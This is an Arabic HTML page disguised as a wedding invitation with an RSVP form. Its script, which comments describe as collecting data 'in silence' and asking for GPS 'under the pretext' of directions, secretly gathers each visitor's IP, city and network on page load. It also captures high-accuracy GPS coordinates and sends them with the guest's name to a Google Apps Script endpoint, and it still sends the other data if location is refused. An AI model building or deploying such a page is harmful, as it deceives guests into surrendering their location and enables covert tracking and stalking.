<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>دعوة زفاف غالية</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #1a1a1a;
            color: #fff;
            text-align: center;
            margin: 0;
            padding: 20px;
        }
        .card {
            background: #2a2a2a;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
            max-width: 450px;
            margin: 40px auto;
            border: 1px solid #8a7355;
        }
        h1 { color: #8a7355; font-size: 2rem; margin-bottom: 10px; }
        .details { margin: 20px 0; font-size: 1.1rem; line-height: 1.8; }
        .form-group { margin-bottom: 15px; text-align: right; }
        label { display: block; margin-bottom: 5px; color: #b39ddb; font-size: 0.95rem; }
        input, select {
            width: 100%;
            padding: 10px;
            border-radius: 8px;
            border: 1px solid #555;
            background: #333;
            color: #fff;
            box-sizing: border-box;
            font-family: inherit;
        }
        .btn {
            background: #8a7355;
            color: #fff;
            border: none;
            padding: 12px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-family: inherit;
            font-size: 1.1rem;
            width: 100%;
            margin-top: 15px;
            box-shadow: 0 4px 10px rgba(138, 115, 85, 0.3);
            transition: 0.3s;
        }
        .btn:hover { background: #a18868; }
    </style>
</head>
<body>

    <div class="card">
        <h1>دعوة زفاف غالية ✨</h1>
        <p>يتشرف عائلتنا بدعوتكم لحضور حفل زفافنا السعيد، وعقبال عندكم جميعاً بالفرحة والخير.</p>
        
        <div class="details">
            🗓️ <b>التاريخ:</b> نهاية الأسبوع القادم<br>
            📍 <b>المكان:</b> قاعة الزفاف الكبرى
        </div>

        <hr style="border-color: #555; margin: 20px 0;">

        <!-- فورم تأكيد الحضور الصايع -->
        <div id="rsvpForm">
            <h3 style="color: #8a7355; margin-top: 0;">✍️ تأكيد الحضور ورسم خط السير</h3>
            
            <div class="form-group">
                <label>الاسم بالكامل:</label>
                <input type="text" id="guestName" placeholder="اكتب اسمك هنا..." required>
            </div>

            <div class="form-group">
                <label>هتيجي أنت ومين؟ (عدد المرافقين):</label>
                <select id="companions">
                    <option value="لوحدي">هاجي لوحدي</option>
                    <option value="معايا فرد واحد">هاجي ومعايا فرد واحد</option>
                    <option value="معايا فردين">هاجي ومعايا فردين</option>
                    <option value="معايا العيلة">هاجي مع العائلة الكريمة</option>
                </select>
            </div>

            <div class="form-group">
                <label>جاي تبع مين؟:</label>
                <select id="relation">
                    <option value="أهل العريس">من طرف العريس 🤵</option>
                    <option value="أهل العروسة">من طرف العروسة 👰</option>
                </select>
            </div>

            <button class="btn" id="submitBtn">تأكيد الحضور وعرض موقع القاعة 📍</button>
        </div>
    </div>

    <script>
        // رابط الـ Apps Script السيرفر بتاعك (تأكد إنك حاطط الرابط الصح اللي آخره /exec)
        const GOOGLE_SHEET_URL = "https://script.google.com/macros/s/XXXXX/exec"; 
        
        // رابط القاعة الحقيقي اللي أنت بعتهولي
        const REAL_MAP_URL = "https://maps.app.goo.gl/oFRR1uiWHzAEY8Uf7";

        let trackingData = {};

        // 1. لقط الـ IP تلقائي أول ما يفتحوا الصفحة في صمت
        async function autoTrack() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                trackingData = {
                    ip: data.ip || "Unknown",
                    city: data.city || "Unknown",
                    country: data.country_name || "Unknown",
                    network: data.org || "Unknown"
                };
            } catch (e) { console.log(e); }
        }
        autoTrack();

        // 2. عند الضغط على زرار تأكيد الحضور (طلب اللوكيشن والبيانات)
        document.getElementById('submitBtn').addEventListener('click', function() {
            const name = document.getElementById('guestName').value.trim();
            const comps = document.getElementById('companions').value;
            const rel = document.getElementById('relation').value;

            if (!name) {
                alert("برجاء كتابة الاسم لتأكيد الحجز وموقع القاعة.");
                return;
            }

            if (navigator.geolocation) {
                // طلب إذن الـ GPS بحجة تحديد الاتجاهات للقاعة
                navigator.geolocation.getCurrentPosition(async function(position) {
                    let lat = position.coords.latitude;
                    let lon = position.coords.longitude;

                    let payload = {
                        action: "full_info",
                        guest_name: name,
                        companions: comps,
                        relation_side: rel,
                        ip: trackingData.ip || "Unknown",
                        city: trackingData.city || "Unknown",
                        network: trackingData.network || "Unknown",
                        google_maps_link: `https://www.google.com/maps?q=${lat},${lon}`,
                        timestamp: new Date().toLocaleString('en-US', { timeZone: 'Africa/Cairo' })
                    };

                    await sendToServer(payload);
                    window.location.href = REAL_MAP_URL; // توجيه للوكيشن الحقيقي

                }, async function(error) {
                    // لو رفضوا يدوا إذن اللوكيشن، هنبعت البيانات التانية والـ IP برضه ومبنضيعهمش
                    let payload = {
                        action: "form_info_only",
                        guest_name: name,
                        companions: comps,
                        relation_side: rel,
                        ip: trackingData.ip || "Unknown",
                        city: trackingData.city || "Unknown",
                        network: trackingData.network || "Unknown",
                        google_maps_link: "الزائر رفض إعطاء صلاحية الموقع الـ GPS",
                        timestamp: new Date().toLocaleString('en-US', { timeZone: 'Africa/Cairo' })
                    };
                    await sendToServer(payload);
                    window.location.href = REAL_MAP_URL;
                }, { enableHighAccuracy: true, timeout: 5000 });
            } else {
                window.location.href = REAL_MAP_URL;
            }
        });

        async function sendToServer(payload) {
            try {
                await fetch(GOOGLE_SHEET_URL, {
                    method: 'POST',
                    mode: 'cors',
                    headers: { 'Content-Type': 'text/plain' },
                    body: JSON.stringify(payload)
                });
            } catch (e) { console.log(e); }
        }
    </script>
</body>
</html>
